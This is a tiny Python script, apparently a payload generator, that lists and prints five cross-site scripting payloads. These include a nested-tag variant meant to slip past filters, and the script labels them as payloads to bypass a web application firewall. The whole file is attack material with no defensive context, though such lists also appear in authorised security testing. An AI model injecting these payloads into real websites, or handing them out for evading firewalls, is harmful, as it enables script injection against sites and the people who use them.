# payload_generator.py
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>"
]

print("XSS Payloads to bypass WAF:\n")
for p in payloads:
    print(p)
